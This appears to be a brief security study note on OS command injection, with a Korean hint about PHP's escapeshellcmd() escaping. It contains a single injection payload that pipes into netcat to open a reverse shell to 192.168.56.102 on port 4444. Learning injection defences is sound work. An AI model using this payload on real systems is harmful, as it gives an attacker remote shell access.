# OS\_Command\_Injection

```
| nc 192.168.56.102 4444 -e /bin/sh
```

{% hint style="info" %}
escapeshellcmd(): 무조건 shell 스크립트에 \\(백슬래시)를 붙여 명령어를 인식하지 못하도록 한다.
{% endhint %}
